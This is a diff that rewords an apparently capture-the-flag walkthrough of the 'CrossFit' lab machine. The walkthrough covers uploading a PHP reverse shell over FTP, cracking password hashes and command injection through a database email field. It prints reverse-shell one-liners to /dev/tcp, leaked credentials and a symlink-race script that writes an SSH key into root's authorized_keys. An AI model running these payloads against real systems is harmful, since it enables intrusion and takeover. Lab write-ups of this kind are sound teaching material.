-In the `ftp/database/factories/` folder there was a file called `UserFactory.php`.  
+The `ftp/database/factories/` folder contained a file named `UserFactory.php`.  
 
 ```php
 <?php
@@ -806,7 +800,7 @@ $factory->define(User::class, function (Faker $faker) {
 });
 ```
 
-This file contained a password hash, which I loaded into hashcat.  It cracked almost instantly to reveal ... 'password'.  This was most likely a placeholder.
+It held a password hash, which I fed to hashcat.  It cracked almost instantly to ... 'password'.  Clearly just a placeholder.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls
@@ -816,7 +810,7 @@ drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
 drwxr-xr-x    2 0        0            4096 May 01  2020 html
 ```
 
-While I was looking at the four main folders' permissions, I realized that the permissions for `/development-test` allowed for writing to the directory.
+Examining the permissions on the four main folders, I noticed that `/development-test` was writable.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls
@@ -832,7 +826,7 @@ lftp test3@ftp.crossfit.htb:/development-test> put ~/php-reverse-shell.php
 ```
 ```
 
-Using the FTP command `PUT` I was able to upload files.  I used this to upload a PHP backdoor that would send me a reverse shell when executed.
+The FTP `PUT` command let me upload files, which I used to drop a PHP backdoor that would fire a reverse shell once executed.
 
 ```javascript
 //get and run reverse shell
@@ -850,13 +844,13 @@ request2.send()
 
 ```
 
-I once again modified my original JavaScript exploit from earlier, this time simply requesting access to my PHP backdoor.  I hoped that this would execute the code within and send me a reverse shell.  On this one I took a logical leap.  I assumed that since each of the other folders was running a virtually hosted web domain that `development-test` would be the same \(even though there was currently no web page hosted there\).
+I reused my earlier JavaScript exploit yet again, this time just requesting my PHP backdoor.  The hope was that this would run the code and return a reverse shell.  Here I made an educated guess: since each of the other folders mapped to a virtually hosted web domain, I assumed `development-test` would too \(even though nothing was currently served there\).
 
 ```text
 <YOUR_IP> - - [15/Jan/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
 ```
 
-I received a connection request for my JavaScript code, and Burp, which I had used to send the request, showed that the server was stuck while trying to send me a response.  This was good sign as this tends to happen when sending a reverse shell this way.
+A request came in for my JavaScript, and Burp, which I'd used to issue the request, showed the server hanging while trying to respond.  That's a good sign, since it's typical behavior when delivering a reverse shell this way.
 
 ## Initial Foothold
 
@@ -886,11 +880,9 @@ www-data@crossfit:/$ stty rows 54 columns 104
 www-data@crossfit:/$ export TERM=xterm-256color
 ```
 
-After a little bit of waiting, I got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  
+After a short wait, a shell landed on my netcat listener!  My first step was upgrading to a full PTY with Python.  
 
-{% hint style="info" %}
-Before starting my netcat listener I did some setup.  First I ran the **`script`** command to log all of my commands and output, and I also used **`bash`** because **`zsh`** has a problem \(at least on my system, not sure if it is a confirmed bug\) where backgrounding the connection and setting **`stty raw -echo`** breaks the shell in a way that I cannot use **`enter`** or control key commands.  If anyone has any feedback on this I would appreciate it!
-{% endhint %}
+I did a bit of prep before launching netcat.  I ran **`script`** to capture all my commands and output, and switched to **`bash`** because **`zsh`** has an issue \(at least on my box, not sure it's a confirmed bug\) where backgrounding the connection and setting **`stty raw -echo`** mangles the shell so that **`enter`** and control keys stop working.  If anyone has insight on this, I'd love to hear it!
 
 ### Enumeration as `www-data`
 
@@ -914,7 +906,7 @@ www-data 32126  0.0  0.0   3736  2908 ?        S    17:35   0:00 bash -c bash -i
 www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
 ```
 
-Hmm...`ps` showed that this was a busy machine...  It looked like I had company \(only one of those shells is mine!\).
+Hmm...`ps` revealed this was a busy box...  Looked like I had company \(only one of those shells belonged to me!\).
 
 ```bash
 www-data@crossfit:/run$ cat /etc/passwd
@@ -953,7 +945,7 @@ ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
 hank:x:1004:1006::/home/hank:/bin/bash
 ```
 
-I inspected `/etc/passwd` for local user accounts and found that `root`, `isaac`, and `hank` could login with a shell.  These were my most likely targets.
+Checking `/etc/passwd` for local accounts, I saw that `root`, `isaac`, and `hank` all had login shells.  Those were my likeliest targets.
 
 ```text
 www-data@crossfit:/home$ ls -la
@@ -964,7 +956,7 @@ drwxr-xr-x  6 hank  hank  4096 Mar 20 17:24 hank
 drwxr-xr-x  8 isaac isaac 4096 Mar 21 07:19 isaac
 ```
 
-In the `/home` directory there were only two user folders: `hank` and `isaac`.
+The `/home` directory contained just two user folders: `hank` and `isaac`.
 
 ```text
 www-data@crossfit:/home$ ls -la hank
@@ -1005,9 +997,7 @@ drwx------ 3 isaac isaac   4096 Mar 21 06:59 .ssh
 drwxrwxrwx 4 isaac admins  4096 May  9  2020 send_updates
 ```
 
-I saw that `hank` had `user.txt` in his home folder, so now I knew I needed to move laterally to that user to get it.
-
-TODO: insert output of search for hank in files \(I may have deleted this since because of too many files?\)
+Since `user.txt` sat in `hank`'s home folder, I knew I'd need to pivot to that user to grab it.
 
 ```text
 www-data@crossfit:/etc/ansible/playbooks$ ls -la
@@ -1032,7 +1022,7 @@ www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml
         append: yes
 ```
 
-After searching for files that had mentioned the user `hank`, I found `adduser-hank.yml` in the`/etc/ansible/playbooks` directory.  This file had a password hash in it that I copied to my machine for cracking.
+Grepping for files that referenced `hank`, I came across `adduser-hank.yml` in the `/etc/ansible/playbooks` directory.  It contained a password hash, which I copied back to my machine to crack.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -1089,7 +1079,7 @@ Started: Fri Jan 15 23:09:29 2021
 Stopped: Fri Jan 15 23:10:02 2021
 ```
 
-Password hashes with `$6` at the beginning are most likely Unix sha512crypt encrypted.  I used this information to quickly crack the hash using hashcat.  It revealed the password to be `powerpuffgirls`.
+Hashes starting with `$6` are almost always Unix sha512crypt.  Knowing that, I cracked it quickly in hashcat, recovering the password `powerpuffgirls`.
 
 ### User.txt
 
@@ -1130,7 +1120,7 @@ hank@crossfit:~$ cat user.txt
 9e32************************f446
 ```
 
-After cracking the hash to get the password I fired up SSH and logged in as `hank`.  The first thing I did was collect my hard-earned proof.
+With the cracked password in hand, I SSH'd in as `hank` and immediately grabbed my hard-earned proof.
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -1141,14 +1131,14 @@ hank@crossfit:~$ id
 uid=1004(hank) gid=1006(hank) groups=1006(hank),1005(admins)
 ```
 
-The user `hank` was in the group `admins` which sounded interesting.
+`hank` belonged to the `admins` group, which looked promising.
 
 ```text
 hank@crossfit:~$ sudo -l
 -bash: sudo: command not found
 ```
 
-Well, this was odd... It told me that it could not find the `sudo` command.  I went and checked inside `/usr/sbin` and there was no binary for `sudo` installed.
+Strange... it reported that `sudo` wasn't found.  Checking `/usr/sbin`, sure enough, no `sudo` binary was installed.
 
 ```text
 hank@crossfit:~$ ifconfig
@@ -1170,14 +1160,14 @@ hank@crossfit:~$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-The program `ifconfig` was also missing.
+`ifconfig` was missing as well.
 
 ```text
 hank@crossfit:~$ uname -a
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 ```
 
-I decided to check and see if this was a strange distribution, or a BSD system, but `uname -a` told me that this was a Debian-based system. Curiouser and curiouser...
+I wondered whether this was some unusual distro or a BSD system, but `uname -a` confirmed it was Debian-based. Curiouser and curiouser...
 
 ```text
 hank@crossfit:/dev/shm$ ps aux > ps
@@ -1196,7 +1186,7 @@ hank      8488  0.0  0.1   8504  5316 pts/0    Ss   10:57   0:00 -bash
 hank      8638  0.0  0.0  10632  3112 pts/0    R+   11:07   0:00 ps aux
 ```
 
-I checked for running processes and noticed a few things were running from the `/opt/selenium` folder. I wasn't sure what that was so I looked it up. I also noticed that I was unable to see any processes from other users.
+Looking at the running processes, I saw several originating from `/opt/selenium`. Unsure what that was, I looked it up. I also noticed I couldn't see any processes belonging to other users.
 
 * [https://www.selenium.dev/](https://www.selenium.dev/)
 
@@ -1216,7 +1206,7 @@ drwxr-xr-x  9 root     root   4096 May 12  2020 gym-club
 drwxr-xr-x  2 root     root   4096 May  1  2020 html
 ```
 
-While checking for folders in the `/var/www` directory I noticed they looked suspiciously familiar...I also noticed the permissions for the user and group.  The `vsftpd` group was what had allowed me to `PUT` files in the `development-test` folder using FTP.  Interestingly, I could have also done this through a web interface if there had been a site hosted here because it was owned by `www-data`.  This is probably why the folder was empty.
+Browsing the folders under `/var/www`, I noticed they looked suspiciously familiar...and I paid attention to the user and group ownership.  Membership in the `vsftpd` group was what had let me `PUT` files into `development-test` over FTP.  Interestingly, since it was owned by `www-data`, I could have done the same through a web interface had a site been hosted there.  That's probably why the folder was empty.
 
 ```sql
 hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit
@@ -1309,7 +1299,7 @@ MariaDB [information_schema]> show tables;
 ---snipped---
 ```
 
-After looking at the folders in `/var/www` I remembered that I had found credentials for logging into MySQL there.  I used the credentials to log into the database, but there was no useful information to be found. It only held information that was displayed on the website.
+Seeing the `/var/www` folders reminded me I'd already found MySQL credentials there.  I used them to connect to the database, but found nothing useful, just the data already shown on the website.
 
 ```php
 <?php
@@ -1365,7 +1355,7 @@ if($conn)
 </html>
 ```
 
-In the `/security_threat` folder there was a file called `reports.php` that held the code for reporting the detected XSS events to the admin.  Apparently there was also another file that saved the report to the database, because this one only retrieved it, displayed it to the `reports.php` page when viewed, then deleted it from the database.
+The `/security_threat` folder held a `reports.php` file containing the code that reports detected XSS events to the admin.  There must have been another file responsible for saving reports to the database, since this one only fetched a report, rendered it on the `reports.php` page when viewed, then deleted it from the database.
 
 ```text
 hank@crossfit:/home/isaac/send_updates$ find / -group admins 2>/dev/null
@@ -1397,7 +1387,7 @@ hank@crossfit:/home/isaac/send_updates$ find / -group admins 2>/dev/null
 /etc/pam.d/runuser
 ```
 
-I searched for files that `hank` could access as a member of the `admins` group, and found a bunch of them that were in the `/etc/pam.d` directory.  This was quite interesting since PAM deals with user authentication.
+I searched for files `hank` could access via the `admins` group and turned up a pile of them in `/etc/pam.d`.  That was very interesting, since PAM handles user authentication.
 
 ```bash
 auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
@@ -1415,7 +1405,7 @@ auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers 
 auth    required        pam_shells.so
 ```
 
-In `/etc/pam.d` the file `vsftpd` contained the password for the user `ftpadm`.
+The `vsftpd` file in `/etc/pam.d` held the password for the `ftpadm` user.
 
 ### `ftpadm`
 
@@ -1470,7 +1460,7 @@ Subsystem       sftp    /usr/lib/openssh/sftp-server
 DenyUsers ftpadm
 ```
 
-Unfortunately, the SSH configuration was set to explicitly deny `ftpadm` from logging in through SSH.  I could also see that it was configured to run the subsystem for SFTP.
+Unfortunately, the SSH config explicitly denied `ftpadm` from logging in over SSH.  I also noted that the SFTP subsystem was enabled.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -1480,7 +1470,7 @@ lftp ftpadm@<YOUR_IP>:~> ls
 drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
 ```
 
-I tried instead to log in through FTP once again.  This time, there was only one folder `messages`, which I had read-write access to, but was empty.  Once again I uploaded a reverse shell and tried to execute it, but I wasn't sure where the folder was in the filesystem.  I decided to keep this in mind as I continued my enumeration.
+So I went back to logging in over FTP instead.  This time there was a single folder, `messages`, which I had read-write access to but was empty.  Again I uploaded a reverse shell and tried to trigger it, but I didn't know where the folder lived on disk.  I filed this away and kept enumerating.
 
 ### send\_updates.php
 
@@ -1511,7 +1501,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 ```
 
-In `/etc/crontab` there was a cron running every minute. This cron ran the script `/home/isaac/send_updates/send_updates.php` as the user `isaac`.
+`/etc/crontab` had a job firing every minute that ran `/home/isaac/send_updates/send_updates.php` as the user `isaac`.
 
 ```php
 <?php
@@ -1553,7 +1543,7 @@ cleanup();
 ?>
 ```
 
-In the folder `/home/isaac/send_updates` I found the `send_updates.php` file. Reading through the code, it seemed as if it was created to email the "CrossFit Club Newsletter" automatically to all users in the database \(once a minute?! talk about spam!\). The `mail` command was being run by the `mikehaertl\shellcommand\Command` library, which after a short search I found on GitHub.
+In `/home/isaac/send_updates` I found the `send_updates.php` file. Reading the code, it appeared to automatically email the "CrossFit Club Newsletter" to every user in the database \(once a minute?! talk about spam!\). The `mail` command was invoked through the `mikehaertl\shellcommand\Command` library, which a quick search located on GitHub.
 
 * [https://github.com/mikehaertl/php-shellcommand](https://github.com/mikehaertl/php-shellcommand)
 
@@ -1567,11 +1557,11 @@ In the folder `/home/isaac/send_updates` I found the `send_updates.php` file. Re
 }
 ```
 
-The file `composer.json` showed the version of this library was 1.6.0.  A web search showed that this was vulnerable to command injection.
+`composer.json` pinned this library at version 1.6.0.  A web search revealed that version was vulnerable to command injection.
 
 * [https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426](https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426)
 
-Since this library is used to execute arbitrary commands, and there was no kind of filtering being done on the `email` parameter, this could be used to inject other commands.
+Because this library executes arbitrary commands and the `email` parameter was passed through unfiltered, it could be abused to inject additional commands.
 
 ```text
 hank@crossfit:/home/isaac/send_updates$ mail --help
@@ -1642,7 +1632,7 @@ GNU Mailutils home page: <http://mailutils.org>
 General help using GNU software: <http://www.gnu.org/gethelp/>
 ```
 
-Looking at the `mail` program's help, I noticed that there was a flag `-E` that allowed for execution of commands. Since I already had the credentials to the database, it seemed likely that I could create an entry in the user's table that contained code I wanted to execute as `isaac` in the email field of the database to be loaded and run within`send_updates.php`. `isaac` did not have a `.ssh` folder to insert my public key to, so I needed to craft a reverse shell instead.  
+In the `mail` help output I spotted a `-E` flag that allows executing commands. Since I already had database credentials, it looked feasible to add a row to the users table whose email field carried the command I wanted run as `isaac`, which `send_updates.php` would then load and execute. `isaac` had no `.ssh` folder to drop my public key into, so I needed a reverse shell instead.  
 
 ```text
 hank@crossfit:/home/isaac$ mysql -u crossfit -p -D crossfit
@@ -1672,7 +1662,7 @@ MariaDB [crossfit]> select * from users;
 1 row in set (0.000 sec)
 ```
 
-I logged into MySQL using the same credentials as before, and checked for the field names in the `user` table so I knew how to frame my query to insert my reverse shell into the correct field.  I assumed that the `id` field was set to `AUTO_INCREMENT`, but just in case I set it to the value "1" to ensure my code would be the first entry.  The script from earlier said it pulled only the first entry.  
+I logged into MySQL with the same credentials and checked the `user` table's column names so I'd know how to target the right field with my reverse shell.  I figured `id` was `AUTO_INCREMENT`, but to be safe I set it to "1" so my row would be the first entry.  Recall the earlier script only read the first entry.  
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -1685,7 +1675,7 @@ isaac@crossfit:~$ test
 isaac@crossfit:~$ exit
 ```
 
-I got a connection back from my injected code, however it also immediately ran two commands \( I did not type these: `test` and `exit`\) which caused it to disconnect.  I also could not get the same injected command to work later for some reason.  I had no idea what was broken here, or why those commands got run. 
+My injected code did call back, but it also immediately ran two commands I never typed \(`test` and `exit`\), which dropped the connection.  Later I couldn't get the same injection to fire again for some reason.  I had no clue what was breaking it or why those commands ran. 
 
 ```bash
 $fs_iterator = new FilesystemIterator($msg_dir);
@@ -1695,7 +1685,7 @@ $fs_iterator = new FilesystemIterator($msg_dir);
         if($file_info->isFile())
 ```
 
-I looked back through the code in `send_updates.php` looking for clues for how to proceed.  I noticed that these loops look through everything in `$msgdir` and check to see if there was a file, and if so, it would run the rest of the code.  
+I revisited the `send_updates.php` code for clues on how to proceed.  I noticed these loops iterate over everything in `$msgdir`, checking for a file, and only run the rest of the code if one is present.  
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -1708,7 +1698,7 @@ lftp ftpadm@<YOUR_IP>:/messages> put ~/rev-php.php
 73 bytes transferred
 ```
 
- After some testing I found out that I needed to trigger the message by uploading a file into the `messages` folder after logging in with `ftpadm`.  It did not seem to matter what the file was. 
+ After some testing I learned that I had to kick things off by uploading a file into the `messages` folder while logged in as `ftpadm`.  The contents of the file didn't appear to matter. 
 
 ```text
 MariaDB [crossfit]> INSERT INTO users (id,email) VALUES (8081,"-E $(bash -c 'bash -i >& /dev/tcp/10.10.14.176/8081 0>&1')");
@@ -1723,14 +1713,14 @@ MariaDB [crossfit]> select * from users;
 1 row in set (0.000 sec)
 ```
 
-I changed ports and tried inserting my reverse shell again, and this time got a steady connection. 
+I switched ports and re-inserted my reverse shell, and this time the connection held steady. 
 
 ```sql
 MariaDB [crossfit]> INSERT INTO users (email) VALUES ("test & bash -c 'bash -i >& /dev/tcp/10.10.14.176/10001 0>&1'");
 Query OK, 1 row affected (0.001 sec)
 ```
 
-I lost my connection again due to an "unplanned network outage", so had to try again.  I forgot about the `-E` flag when I came back to this and found another way to get my code to execute.  Chaining bash commands using `&` also worked.
+An "unplanned network outage" cost me my connection, so I had to retry.  By the time I came back I'd forgotten about the `-E` flag and found another route to execution.  Chaining bash commands with `&` worked just as well.
 
 ### Enumeration as `isaac`
 
@@ -1744,7 +1734,7 @@ bash: no job control in this shell
 isaac@crossfit:~$
 ```
 
-I finally got a shell back after triggering it by uploading a file to the ftp server.
+I finally caught a shell after triggering it by uploading a file to the FTP server.
 
 ```text
 isaac@crossfit:~$ id
@@ -1752,7 +1742,7 @@ id
 uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
 ```
 
-There was a new group `staff` that had access to a bunch of files related to selenium.
+I now had a new group, `staff`, which had access to a number of selenium-related files.
 
 ```bash
 isaac@crossfit:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -1768,7 +1758,7 @@ isaac@crossfit:~$ stty rows 23 columns 103
 isaac@crossfit:~$ export TERM=xterm-256color
 ```
 
-Next, I upgraded to full PTY shell.
+Next I upgraded to a full PTY shell.
 
 ```text
 isaac@crossfit:~/send_updates$ cd includes
@@ -1783,7 +1773,7 @@ drwxr-x--- 4 isaac admins 4096 May  9  2020 ..
 -rw-r----- 1 isaac isaac   520 May  5  2020 functions.php
 ```
 
-I did some investigating to figure out why I had to upload a file to get the code to execute
+I dug in to understand why uploading a file was necessary to get the code to run
 
 ```php
 <?php
@@ -1791,7 +1781,7 @@ $msg_dir = "/srv/ftp/messages";
 ?>
 ```
 
-In the `includes` folder there was a file `config.php` that pointed to `/srv/ftp/messages`.  This was the variable I had seen in the `send_updates.php` script.
+The `includes` folder held a `config.php` defining `/srv/ftp/messages`.  This was the variable referenced in `send_updates.php`.
 
 ```php
 <?php
@@ -1817,7 +1807,7 @@ function cleanup()
 ?>
 ```
 
-The file `functions.php` explained why my query would be deleted from the database every so often.
+The `functions.php` file explained why my row kept getting removed from the database periodically.
 
 ```text
 isaac@crossfit:~/send_updates/vendor/composer$ ps aux
@@ -1836,7 +1826,7 @@ isaac     3309  0.0  0.1   7764  4336 ?        S    17:27   0:00 bash -i
 isaac     3557  0.0  0.0  10632  3144 ?        R    17:42   0:00 ps aux
 ```
 
-In the process output I could see my reverse shells \(I tried two different methods\), but nothing else that was useful.
+The process listing showed my reverse shells \(I'd tried two different methods\), but nothing else worth noting.
 
 ### dbmsg
 
@@ -1886,7 +1876,7 @@ In the process output I could see my reverse shells \(I tried two different meth
 2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4
 ```
 
-I tried using pspy \(with the `-f` flag to see files as they are accessed\) to see if it was just `ps` that was being restricted, and I noticed the program `dbmsg` that I didn't recognize.
+I ran pspy \(with `-f` to watch files as they're accessed\) to check whether `ps` was the only thing being restricted, and I spotted an unfamiliar program called `dbmsg`.
 
 ```text
 isaac@crossfit:~$ man dbmsg
@@ -1894,7 +1884,7 @@ man dbmsg
 No manual entry for dbmsg
 ```
 
-There was no man page, and after looking around on the internet for awhile and not finding anything I figured it must be a home-brewed application.
+There was no man page, and after searching online for a while with no results I concluded it was a custom-built application.
 
 ```text
 isaac@crossfit:~$ strings /bin/dbmsg
@@ -1910,7 +1900,7 @@ This program must be run as root.
 ...snipped...
 ```
 
-A quick peek into the strings inside the file proved this to be true.
+A quick look at the strings inside the binary confirmed that hunch.
 
 ```c
 void main(void)
@@ -1933,7 +1923,7 @@ void main(void)
 }
 ```
 
-I exfiltrated the binary to my system and opened the program in [ghidra](https://ghidra-sre.org/).  After locating the `main()` function, I saw that it ran as root.  This looked to be a good bet for escalation of privileges.  The program appeared to check the current system time, create a random number using the time as a seed, then run the `process_data()` function.
+I pulled the binary back to my machine and loaded it into [ghidra](https://ghidra-sre.org/).  Finding `main()`, I saw it ran as root, which made it a strong candidate for privilege escalation.  The function read the current system time, seeded a random number with it, then called `process_data()`.
 
 ```c
 void process_data(void)
@@ -2032,9 +2022,9 @@ void process_data(void)
 }
 ```
 
-The `process_data()` function opened a connection to the MySQL database and logged in.  Then it pulled all of the data from the `messages` table and stored the result in a variable. It then opened the file `/var/backups/mariadb/comments.zip`.  After opening the `messages` table and the zip file, it appeared that the program took each entry in the messages table and created a file in `/var/local` using the `md5sum` of the random number it creates as the filename, then added each file to the zip.  
+`process_data()` connected and logged into the MySQL database, then read everything from the `messages` table into a variable. After that it opened `/var/backups/mariadb/comments.zip`.  With both the table and the zip open, the program seemed to take each row in the messages table, write it to a file in `/var/local` named after the `md5sum` of its random number, then add each file to the zip.  
 
-If I could create a file with the correct "random" filename in the `/var/local` directory and link it to a file of my choice before the program executed the write action, the output of my database entry in `message` would be written to the file \(and therefore to the linked file\).  Whew, this was a bit complicated!
+If I could pre-create a file with the correct "random" filename in `/var/local` and symlink it to a target of my choosing before the program performed its write, the output of my `message` row would be written to that file \(and thus to the symlink target\).  Whew, a bit convoluted!
 
 ```text
 isaac@crossfit:/dev/shm$ cd /var/backups/mariadb
@@ -2042,7 +2032,7 @@ cd /var/backups/mariadb
 bash: cd: /var/backups/mariadb: Permission denied
 ```
 
-I tried to see what was in the backup zip file to see if I could validate my analysis of the program, but I was unable to access the directory that file was stored in.
+I wanted to inspect the backup zip to validate my read of the program, but I couldn't access the directory it lived in.
 
 ```c
 #include <stdio.h>
@@ -2061,26 +2051,24 @@ int main(void)
 }
 ```
 
-I did some research into creating a random number seed using C and then printing that number to a file.  
+I researched how to seed a random number in C and print that value out.  
 
 * [https://www.tutorialspoint.com/c\_standard\_library/c\_function\_srand.htm](https://www.tutorialspoint.com/c_standard_library/c_function_srand.htm)
 * [https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once](https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once)
 
-I wrote a short function in C that emulated what the program was doing: using the current time to generate a pseudo-random number, then outputting that number to the terminal.  I would use a script to use `md5sum` on the generated number and write it to a file since that would be much easier than writing a whole C program to do this.
+I wrote a small C function mirroring the program's logic: generating a pseudo-random number from the current time and printing it to the terminal.  I'd let a shell script handle `md5sum`-ing the number and writing the file, which was far simpler than doing all of it in C.
 
 ```text
 gcc rand.c -o /dev/shm/rand
 ```
 
-I compiled the small program, then created a script to run it
+I compiled the little program, then wrote a script to drive it
 
 ```bash
 #test.sh
 touch /var/local/testing
 while true; do ln -s /var/local/testing /var/local/$(echo -n $(/dev/shm/rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
 ```
-
-TODO:fix this paragraph., linking the file to root's `authorized_users`  and \(hopefully!\) writing my public SSH key to it.test script to see if I can write to random location and see if my output appears. update: test worked... automating process because its a pain, and deletes every thing so fast...The '1' after running my random number program is the ID field value from my SQL statement.
 
 ```text
 hank@crossfit:/var/local$ ls -la
@@ -2133,7 +2121,7 @@ hank@crossfit:/var/local$ cat *
 cat: d41d8cd98f00b204e9800998ecf8427e: No such file or directory
 ```
 
-My random files were generated, and then suddenly and swiftly removed by the cleaning crew. I tried to do a test run, but the files were deleted so fast that I couldn't get the `testing` file to stick around. I thought about trying to get the output to redirect to `/dev/tcp` to show up at a netcat listener on my machine, but I was confident that I had made it work and pushed on with trying to get `root` access.
+My random files appeared, then were promptly wiped out by the cleanup process. During a test run the files vanished so fast that the `testing` file never stuck around. I considered redirecting the output to `/dev/tcp` so it'd land at a netcat listener on my box, but I was confident the technique worked and pressed on toward `root`.
 
 ```text
 isaac@crossfit:~$ vi rand.c
@@ -2147,7 +2135,7 @@ rand
 isaac@crossfit:/dev/shm$ chmod +x rand
 ```
 
-I compiled my random file generator then made it executable \(removing the evidence of its creation\). After running it, \(note: this is from before I automated all of this with my script later!\)
+I compiled my random number generator and made it executable \(cleaning up the source afterward\). After running it, \(note: this predates automating everything in a script later!\)
 
 ```text
 isaac@crossfit:/var/local$ ls -la
@@ -2157,20 +2145,20 @@ drwxr-xr-x 13 root  root  4096 May 11  2020 ..
 lrwxrwxrwx  1 isaac staff   26 Mar 19 16:15 c4ca4238a0b923820dcc509a6f75849b -> /root/.ssh/authorized_keys
 ```
 
-I added a line to my script that would insert my message into the database, ran my script, and saw the file linked to `root`'s `authorized_keys` file in the proper folder.  However, I was not able to SSH into the machine.
+I added a line to my script to insert my message into the database, ran it, and saw the file symlinked to `root`'s `authorized_keys` in the right directory.  Yet I still couldn't SSH in.
 
 ```text
 isaac@crossfit:/var/local$ /dev/shm/test.sh
 ERROR 1364 (HY000) at line 1: Field 'name' doesn't have a default value
 ```
 
-I scrolled up to check the error messages output from my script, and saw the error that had stopped it from working.  My database query that I put in the script was only inserting my public key into the `messages` field. The database was not set up to function with `NULL` values in the other fields so it was not working. It required values in the other fields.
+Scrolling back through my script's output, I found the error that had been blocking me.  My query was only inserting the public key into the `messages` field, and the table didn't allow `NULL` in the other columns, so the insert failed. The remaining fields all needed values.
 
 ```text
 /dev/shm/test.sh: line 2: ./rand: No such file or directory
 ```
 
-I was also receiving the second error message above that was caused by a cleanup script on the machine which regularly deleted all files in the `/tmp`, `/var/local`, and `/dev/shm` directories \(and maybe more\).
+I was also hitting the second error shown above, caused by a cleanup script that routinely wiped all files from `/tmp`, `/var/local`, and `/dev/shm` \(and possibly others\).
 
 ```sql
 MariaDB [crossfit]> DESCRIBE messages;
@@ -2185,7 +2173,7 @@ MariaDB [crossfit]> DESCRIBE messages;
 4 rows in set (0.001 sec)
 ```
 
-After going back to my shell as `hank` and checking `mysql` I realized my problem.  I was getting an error while inserting my key into the database, but since there was a huge spam of output from my script I didn't see it. I used the `DESCRIBE` command to see the columns in the message table so I could tailor my input better.
+Back in my `hank` shell, inspecting `mysql`, I figured out the issue.  My key insertion was erroring out, but the flood of output from my script had hidden the message. I used `DESCRIBE` to view the message table's columns so I could shape my input correctly.
 
 ```sql
 MariaDB [crossfit]> insert into messages (id, name, email, message) values (1, "ecdsa-sha2-nistp256", "kac0", "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1");
@@ -2201,7 +2189,7 @@ MariaDB [crossfit]> select * from messages
 1 row in set (0.000 sec)
 ```
 
-I had to try a number of different entries, but in the end I had to break the public key into its three components and put them in the fields as seen above.  
+After several attempts, the working approach was to split the public key into its three parts and place them across the fields as shown above.  
 
 | Field | Value |
 | :--- | :--- |
@@ -2219,7 +2207,7 @@ if (local_40 != (FILE *)0x0) {
           fclose(local_40);
 ```
 
-My SQL entry into the `message` database was based off of this section of the code from the `process_data()` function.  It wrote the second field, the fourth field, then the third field to the file.  This means that it wrote them in the order: name, message, email.  These were separated by adding by a space \(`0x20`\) when it wrote to the file. I would need to match my entries to this format.
+I based my `message` table entry on this snippet from `process_data()`.  It wrote the second field, then the fourth, then the third to the file, meaning the order was: name, message, email.  Each was separated by a space \(`0x20`\) on write. I had to format my entries to fit this layout.
 
 ```bash
 #!/bin/bash
@@ -2241,7 +2229,7 @@ touch /var/local/testing
 while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
 ```
 
-I created a shell script to automate everything.  It wrote the C source code to a file, compiled it into a binary, gave it the executable permission, inserted my properly formatted SQL statement into the database, and finally linked `/root/.ssh/authorized_keys` to my randomly generated file. 
+I built a shell script to automate the whole chain.  It wrote out the C source, compiled it to a binary, marked it executable, inserted my correctly formatted SQL statement into the database, and finally symlinked `/root/.ssh/authorized_keys` to my randomly named file. 
 
 ```text
 hank@crossfit:/var/local$ ls -la
@@ -2255,7 +2243,7 @@ lrwxrwxrwx  1 isaac staff    26 Mar 19 17:22 c4ca4238a0b923820dcc509a6f75849b ->
 -rw-r--r--  1 isaac staff     0 Mar 19 17:22 testing
 ```
 
-I verified that the randomly generated file was symlinked to `/root/.ssh/authorized_keys` and hoped that everything worked as planned. 
+I confirmed the random file was symlinked to `/root/.ssh/authorized_keys` and hoped the rest had gone to plan. 
 
 ### Root.txt
 
@@ -2296,4 +2284,5 @@ lrwxrwxrwx  1 root root    9 May  4  2020 .mysql_history -> /dev/null
 drwx------  2 root root 4096 Sep  2  2020 .ssh
 root@crossfit:~# cat root.txt 
 ee0a************************8c80
+```
 ```
